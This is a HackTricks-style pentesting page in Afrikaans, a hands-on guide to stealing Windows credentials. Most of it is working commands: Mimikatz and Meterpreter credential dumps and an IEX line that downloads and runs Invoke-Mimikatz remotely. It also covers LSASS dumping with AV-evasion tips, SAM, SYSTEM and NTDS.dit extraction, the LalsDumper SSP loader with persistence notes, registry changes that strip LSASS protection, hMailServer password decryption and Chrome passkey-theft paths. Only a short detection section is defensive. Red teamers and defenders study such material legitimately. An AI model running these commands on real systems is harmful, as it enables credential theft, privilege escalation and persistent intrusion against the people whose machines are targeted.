# Windows-aanmeldbesonderhede steel

{{#include ../../banners/hacktricks-training.md}}

## Mimikatz-aanmeldbesonderhede
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**Vind ander dinge wat Mimikatz kan doen op** [**hierdie bladsy**](credentials-mimikatz.md)**.**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**Kom meer te wete oor moontlike credential-beskermingsmaatreëls hier.**](credentials-protections.md) **Hierdie beskermingsmaatreëls kan verhoed dat Mimikatz sommige credentials onttrek.**

## Credentials with Meterpreter

Gebruik die [**Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **wat** ek geskep het om **binne die slagoffer na wagwoorde en hashes te soek**.
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## Bypassing AV

### Procdump + Mimikatz

Omdat **Procdump van** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)**'n wettige Microsoft-tool is**, word dit nie deur Defender opgespoor nie.\
Jy kan hierdie tool gebruik om die **lsass-proses te dump**, **die dump af te laai** en die **credentials plaaslik** uit die dump te **ekstraheer**.

Jy kan ook [SharpDump](https://github.com/GhostPack/SharpDump) gebruik.
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
Hierdie proses word outomaties met [SprayKatz](https://github.com/aas-n/spraykatz) uitgevoer: `./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**Nota**: Sommige **AV** mag die gebruik van **procdump.exe to dump lsass.exe** as **malicious** **detect**, omdat hulle die stringe **"procdump.exe" en "lsass.exe"** **detect**. Dit is dus **stealthier** om die **PID** van lsass.exe as ’n **argument** aan procdump deur te gee **in plaas van** die **naam lsass.exe.**

### Dumping lsass met **comsvcs.dll**

’n DLL genaamd **comsvcs.dll**, wat in `C:\Windows\System32` gevind word, is verantwoordelik vir **dumping process memory** wanneer ’n crash plaasvind. Hierdie DLL sluit ’n **function** genaamd **`MiniDumpW`** in, wat ontwerp is om met `rundll32.exe` aangeroep te word.\
Dit is irrelevant om die eerste twee arguments te gebruik, maar die derde een word in drie komponente verdeel. Die process ID wat gedump moet word, vorm die eerste komponent, die dump file location verteenwoordig die tweede, en die derde komponent is streng die woord **full**. Geen alternatiewe opsies bestaan nie.\
Nadat hierdie drie komponente geparse is, word die DLL gebruik om die dump file te skep en die gespesifiseerde process se memory na hierdie file oor te dra.\
Die gebruik van **comsvcs.dll** is haalbaar om die lsass process te dump, wat die behoefte uitskakel om procdump op te laai en uit te voer. Hierdie metode word in detail beskryf by [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords).

Die volgende command word vir uitvoering gebruik:
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**Jy kan hierdie proses outomatiseer met** [**lssasy**](https://github.com/Hackndo/lsassy)**.**

### **Dumping van lsass met Task Manager**

1. Regsklik op die Taakbalk en klik op Task Manager
2. Klik op More details
3. Soek die "Local Security Authority Process"-proses in die Processes-oortjie
4. Regsklik op die "Local Security Authority Process"-proses en klik op "Create dump file".

### Dumping van lsass met procdump

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) is ’n Microsoft-ondertekende binary wat deel is van die [sysinternals](https://docs.microsoft.com/en-us/sysinternals/)-suite.
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## Dump lsass met PPLBlade

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) is 'n Protected Process Dumper Tool wat die memory dump kan obfuscate en dit na remote workstations kan oordra sonder om dit op die disk te laat.

**Sleutelfunksionaliteite**:

1. Omseil PPL-beskerming
2. Obfuscate memory dump-lêers om Defender se signature-based detection mechanisms te ontduik
3. Upload memory dump met RAW- en SMB-uploadmetodes sonder om dit op die disk te laat (fileless dump)
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – SSP-gebaseerde LSASS dumping sonder MiniDumpWriteDump

Ink Dragon lewer ’n drie-fase dumper genaamd **LalsDumper** wat nooit `MiniDumpWriteDump` aanroep nie, sodat EDR hooks op daardie API nooit geaktiveer word nie:

1. **Stage 1 loader (`lals.exe`)** – soek in `fdp.dll` na ’n placeholder wat uit 32 kleinletter-`d`-karakters bestaan, vervang dit met die absolute pad na `rtu.txt`, stoor die gepatchte DLL as `nfdp.dll`, en roep `AddSecurityPackageA("nfdp","fdp")` aan. Dit dwing **LSASS** om die malicious DLL as ’n nuwe Security Support Provider (SSP) te laai.
2. **Stage 2 binne LSASS** – wanneer LSASS `nfdp.dll` laai, lees die DLL `rtu.txt`, XOR elke byte met `0x20`, en map die decoded blob in memory voordat execution oorgedra word.
3. **Stage 3 dumper** – die gemapte payload herimplementeer MiniDump-logika deur **direct syscalls** wat vanaf gehashte API-name opgelos word (`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`). ’n Toegewyde export genaamd `Tom` open `%TEMP%\<pid>.ddt`, stroom ’n compressed LSASS dump na die lêer, en maak die handle toe sodat exfiltration later kan plaasvind.

Operator-notas:

* Hou `lals.exe`, `fdp.dll`, `nfdp.dll`, en `rtu.txt` in dieselfde directory. Stage 1 herskryf die hard-coded placeholder met die absolute pad na `rtu.txt`, dus breek dit die chain as hulle geskei word.
* Registration gebeur deur `nfdp` by `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages` aan te voeg. Jy kan daardie value self seed om LSASS elke boot die SSP te laat herlaai.
* `%TEMP%\*.ddt`-lêers is compressed dumps. Decompress dit lokaal, en voer dit dan aan Mimikatz/Volatility vir credential extraction.
* Om `lals.exe` uit te voer, vereis admin/SeTcb-regte sodat `AddSecurityPackageA` suksesvol is; sodra die call terugkeer, laai LSASS die rogue SSP transparant en voer Stage 2 uit.
* Deur die DLL van disk te verwyder, evict dit nie uit LSASS nie. Verwyder óf die registry entry en restart LSASS (reboot), óf laat dit vir long-term persistence.

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA-geheime
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### Dump die NTDS.dit vanaf die teiken-DC
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### Dump die NTDS.dit-wagwoordgeskiedenis vanaf die teiken-DC
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### Wys die pwdLastSet-kenmerk vir elke NTDS.dit-rekening
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## Stealing SAM & SYSTEM

Hierdie lêers behoort **geleë te wees** in _C:\windows\system32\config\SAM_ en _C:\windows\system32\config\SYSTEM._ Maar **jy kan dit nie sommer op die gewone manier kopieer nie**, omdat hulle beskerm is.

### From Registry

Die maklikste manier om hierdie lêers te steel, is om ’n kopie uit die Registry te kry:
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**Laai** daardie lêers na jou Kali-masjien af en **onttrek die hashes** deur:
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

Jy kan hierdie diens gebruik om protected files te kopieer. Jy moet 'n Administrator wees.

#### Using vssadmin

Die vssadmin binary is slegs in Windows Server-weergawes beskikbaar
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
Maar jy kan dieselfde vanuit **Powershell** doen. Dit is ’n voorbeeld van **hoe om die SAM-lêer te kopieer** (die hardeskyf wat gebruik word, is "C:" en dit word in C:\users\Public gestoor), maar jy kan dit gebruik om enige beskermde lêer te kopieer:
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
### Invoke-NinjaCopy

Laastens kan jy ook die [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) gebruik om ’n kopie van SAM, SYSTEM en ntds.dit te maak.
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory Credentials - NTDS.dit**

Die **NTDS.dit**-lêer staan bekend as die hart van **Active Directory** en bevat belangrike data oor gebruikersobjekte, groepe en hul lidmaatskappe. Dit is waar die **password hashes** vir domeingebruikers gestoor word. Hierdie lêer is ’n **Extensible Storage Engine (ESE)**-databasis en is geleë by **_%SystemRoom%/NTDS/ntds.dit_**.

Binne hierdie databasis word drie primêre tabelle onderhou:

- **Data Table**: Hierdie tabel is verantwoordelik vir die stoor van besonderhede oor objekte soos gebruikers en groepe.
- **Link Table**: Dit hou verhoudings, soos groeplidmaatskappe, dop.
- **SD Table**: **Security descriptors** vir elke objek word hier gehou, wat die sekuriteit en toegangsbeheer vir die gestoorde objekte verseker.

Meer inligting hieroor: [http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/](http://blogs.chrisse.se/2012/02/11/how-the-active-directory-data-store-really-works-inside-ntds-dit-part-1/)

Windows gebruik _Ntdsa.dll_ om met daardie lêer te kommunikeer, en dit word deur _lsass.exe_ gebruik. Gevolglik kan **’n deel** van die **NTDS.dit**-lêer **binne die `lsass`**-geheue geleë wees (jy kan waarskynlik die data kry wat die onlangsste gebruik is, moontlik weens die prestasieverbetering wat deur ’n **cache** verkry word).

#### Decrypting the hashes inside NTDS.dit

Die hash is 3 keer geënkripteer:

1. De-enkripteer die Password Encryption Key (**PEK**) met die **BOOTKEY** en **RC4**.
2. De-enkripteer die **hash** met **PEK** en **RC4**.
3. De-enkripteer die **hash** met **DES**.

**PEK** het dieselfde waarde op **elke domeinbeheerder**, maar dit is binne die **NTDS.dit**-lêer geënkripteer met die **BOOTKEY** van die **SYSTEM**-lêer van die domeinbeheerder (dit verskil tussen domeinbeheerders). Daarom het jy die lêers NTDS.dit en SYSTEM nodig om die credentials uit die NTDS.dit-lêer te verkry (_C:\Windows\System32\config\SYSTEM_).

### Copying NTDS.dit using Ntdsutil

Beskikbaar sedert Windows Server 2008.
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
Jy kan ook die [**volume shadow copy**](#stealing-sam-and-system)-truuk gebruik om die **ntds.dit**-lêer te kopieer. Onthou dat jy ook ’n kopie van die **SYSTEM-lêer** sal benodig (dit weer eens [**uit die registry dump of gebruik die volume shadow copy**](#stealing-sam-and-system)-truuk).

### **Onttrekking van hashes uit NTDS.dit**

Sodra jy die lêers **NTDS.dit** en **SYSTEM** **verkry** het, kan jy tools soos _secretsdump.py_ gebruik om **die hashes te onttrek**:
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
Jy kan hulle ook **outomaties onttrek** met behulp van ’n geldige domeinadmin-gebruiker:
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
Vir **groot NTDS.dit-lêers** word dit aanbeveel om dit met [gosecretsdump](https://github.com/c-sto/gosecretsdump) te onttrek.

Laastens kan jy ook die **metasploit module**: _post/windows/gather/credentials/domain_hashdump_ of **mimikatz** `lsadump::lsa /inject` gebruik.

### **Onttrekking van domeinobjekte uit NTDS.dit na ’n SQLite-databasis**

NTDS-objekte kan met [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) na ’n SQLite-databasis onttrek word. Nie net secrets word onttrek nie, maar ook die volledige objekte en hul attribute vir verdere inligtingsonttrekking wanneer die raw NTDS.dit-lêer reeds verkry is.
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
Die `SYSTEM` hive is opsioneel, maar maak decryption van secrets moontlik (NT- en LM-hashes, supplemental credentials soos cleartext passwords, kerberos- of trust keys, NT- en LM-password histories). Saam met ander inligting word die volgende data onttrek: gebruiker- en masjienrekeninge met hul hashes, UAC flags, timestamp vir laaste logon en password change, rekeningbeskrywings, name, UPN, SPN, groepe en recursive memberships, organizational units tree en membership, trusted domains met trust-tipe, rigting en attributes...

## Lazagne

Laai die binary af vanaf [hier](https://github.com/AlessandroZ/LaZagne/releases). Jy kan hierdie binary gebruik om credentials uit verskeie sagteware te onttrek.
```
lazagne.exe all
```
## Ander tools vir die onttrekking van credentials uit SAM en LSASS

### Windows Credentials Editor (WCE)

Hierdie tool kan gebruik word om credentials uit die memory te onttrek. Laai dit af vanaf: [http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

Onttrek credentials uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

Onttrek geloofsbriewe uit die SAM-lêer
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

Laai dit af vanaf:[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7) en **execute dit**; die wagwoorde sal onttrek word.

## Ontginning van onaktiewe RDP-sessies en verswakking van sekuriteitskontroles

Ink Dragon se FinalDraft RAT bevat ’n `DumpRDPHistory`-tasker waarvan die tegnieke nuttig is vir enige red-teamer:

### DumpRDPHistory-styl telemetrieversameling

* **Uitgaande RDP-teikens** – ontleed elke gebruiker-hive by `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`. Elke subkey stoor die bedienernaam, `UsernameHint` en die tydstempel van die laaste wysiging. Jy kan FinalDraft se logika met PowerShell repliseer:

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Bewyse van inkomende RDP** – bevraag die `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational`-logboek vir Event IDs **21** (suksesvolle aanmelding) en **25** (ontkoppeling) om vas te stel wie die toestel geadministreer het:

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

Sodra jy weet watter Domain Admin gereeld koppel, dump LSASS (met LalsDumper/Mimikatz) terwyl hul **ontkoppelde** sessie steeds bestaan. CredSSP + NTLM-fallback laat hul verifier en tokens in LSASS agter, wat dan oor SMB/WinRM gereplay kan word om `NTDS.dit` te gryp of persistence op domeinbeheerders te stage.

### Register-downgrades wat deur FinalDraft geteiken word

Dieselfde implant peuter ook met verskeie registersleutels om credential theft makliker te maak:
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* Deur `DisableRestrictedAdmin=1` te stel, word volledige credential/ticket-hergebruik tydens RDP afgedwing, wat pass-the-hash-styl pivots moontlik maak.
* `LocalAccountTokenFilterPolicy=1` deaktiveer UAC-tokenfiltrering, sodat plaaslike admins onbeperkte tokens oor die netwerk kry.
* `DSRMAdminLogonBehavior=2` laat die DSRM-administrateur toe om aan te meld terwyl die DC aanlyn is, wat aanvallers nog ’n ingeboude rekening met hoë privileges gee.
* `RunAsPPL=0` verwyder LSASS PPL-beskerming, wat geheuetoegang triviaal maak vir dumpers soos LalsDumper.

## hMailServer-databasisbewyse (post-compromise)

hMailServer stoor sy DB-wagwoord in `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` onder `[Database] Password=`. Die waarde is Blowfish-geënkripteer met die statiese sleutel `THIS_KEY_IS_NOT_SECRET` en 4-byte word-endianness-ruilings. Gebruik die hex-string uit die INI met hierdie Python-fragment:
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
Met die clear-text password, kopieer die SQL CE-databasis om file locks te vermy, laai die 32-bit provider, en upgrade indien nodig voordat jy vir hashes query:
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
Die `accountpassword`-kolom gebruik die hMailServer-hash-formaat (hashcat-modus `1421`). Deur hierdie waardes te crack, kan herbruikbare credentials vir WinRM/SSH-pivots verkry word.
## LSA Logon Callback Interception (LsaApLogonUserEx2)

Sommige tooling capture **plaintext logon passwords** deur die LSA-logon callback `LsaApLogonUserEx2` te intercept. Die idee is om die authentication package callback te hook of te wrap sodat credentials **tydens logon** gecapture word (voor hashing), en dan na skyf geskryf of aan die operator teruggestuur word. Dit word gewoonlik geïmplementeer as ’n helper wat in LSA inject of daarmee registreer, en dan elke suksesvolle interactive/network logon-event met die username, domain en password aanteken.

Operational notes:
- Vereis local admin/SYSTEM om die helper in die authentication path te laai.
- Gecapturede credentials verskyn slegs wanneer ’n logon plaasvind (interactive, RDP-, service- of network-logon, afhangend van die hook).

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) stoor saved connection-inligting in ’n per-user `sqlstudio.bin`-lêer. Dedicated dumpers kan die lêer parse en saved SQL-credentials herwin. In shells wat slegs command output terugstuur, word die lêer dikwels geëksfiltreer deur dit as Base64 te encodeer en dit na stdout te druk.
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
Aan die operator-kant, herbou die lêer en voer die dumper plaaslik uit om credentials te herwin:
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## Passkeys / WebAuthn credential theft vanaf Chrome op Windows

As code execution as die **victim user** op ’n Windows-host verkry word met **Chrome + Google Password Manager**-gesinkroniseerde passkeys, word passkeys ’n interessante post-exploitation-teiken, selfs **sonder admin/SYSTEM**.

### Interessante plaaslike artifacts
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** stoor protobuf-geënkodeerde **`WebauthnCredentialSpecifics`**-rekords. ’n Proses van dieselfde gebruiker kan die **RP ID**, **gebruikersnaam**, **credential ID** en geënkripteerde private-key-materiaal vir gesinkroniseerde passkeys opnoem.
- **`passkey_enclave_state`** stoor plaaslike toestelregistrasiestatus, soos **`wrapped_identity_private_key`** en die wrapped secret wat gebruik word om gesinkroniseerde credentials te herwin.

Vinnige triage:
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound key blobs kan steeds as ’n plaaslike signing oracle misbruik word

As die browser ’n TPM-backed identity key as **`NCRYPT_OPAQUE_KEY_BLOB`** uitvoer en daardie blob in user-accessible state stoor, hoef malware nie die raw private key te onttrek nie. Dit kan eenvoudig die blob op dieselfde masjien herinvoer en die plaaslike TPM vra om attacker-controlled data te sign:
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
Dit beteken **hardware binding voorkom uitvoer buite die toestel, maar nie gebruik deur dieselfde gebruiker op die gekompromitteerde endpoint nie**.

### Praktiese misbruikpaaie

1. **Pass-ta-key / device-identity relay**
- Enumerate `WebauthnCredentialSpecifics` from Chrome's LevelDB.
- Begin 'n passkey-aanmelding en verkry 'n vars WebAuthn challenge.
- Gebruik die gesteelde `wrapped_identity_private_key`-blob op die slagoffer se TPM om die cloud-authenticator request binding te onderteken.
- Relay die teruggestuurde assertion na die relying party.
- Dit is veral waardevol wanneer die RP `userVerification=preferred` aanvaar of versuim om assertions met **`UV=0`** te verwerp.
2. **Pending UV-key hijack**
- Dwing re-onboarding af deur `passkey_enclave_state` te verwyder of deur 'n geldige getekende `device/forget`-operasie te stuur.
- As onboarding die toestel in **`uv_key_pending`** laat, registreer 'n aanvaller-beheerde UV public key.
- As die provider nie attestation / secure-hardware origin vir die nuwe UV key verifieer nie, word latere signatures van die aanvaller se key as **`UV=1`** hanteer.
3. **Master-secret / SDS recovery theft**
- Dwing recovery of rejoin af sodat Chrome die synced-passkey master secret ophaal.
- Monitor die herskepping/wysiging van `passkey_enclave_state`, en dump dan Chrome se memory terwyl die plaintext **security domain secret (SDS)** resident is.
- Gebruik die herwinne SDS om die encrypted fields in elke `WebauthnCredentialSpecifics`-record te decrypt en portable WebAuthn private keys te herwin.

### DFIR / detection-idees

- Monitor **verwydering/herskepping** van `passkey_enclave_state`.
- Genereer 'n alert vir abnormale toegang tot Chrome se **`Sync Data\LevelDB`** deur nie-browserprosesse.
- Genereer 'n alert vir **Chrome memory dumps** of verdagte cross-process memory access.
- Ondersoek herhaalde **Google Password Manager recovery PIN**-prompts of onverwagte re-onboarding.
- Onthou dat WebAuthn se **`signCount`** dikwels nie nuttig is vir synced passkeys nie, omdat dit konstant kan bly; klassieke clone detection is dus swak.

## Verwysings

- [Unit 42 – 'n Ondersoek na Jare van Ongemerkte Operasies wat Hoëwaarde-sektore geteiken het](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [0xdf – HTB/VulnLab JobTwo: Word VBA-macro phishing via SMTP → hMailServer credential decryption → Veeam CVE-2023-27532 na SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [Check Point Research – Binne Ink Dragon: Die Onthulling van die Relay Network en Inner Workings van 'n Stealthy Offensive Operation](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [Unit 42 – Pass the Passkey: 'n Nuwe Attack Surface in Passwordless Authentication](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)

{{#include ../../banners/hacktricks-training.md}}
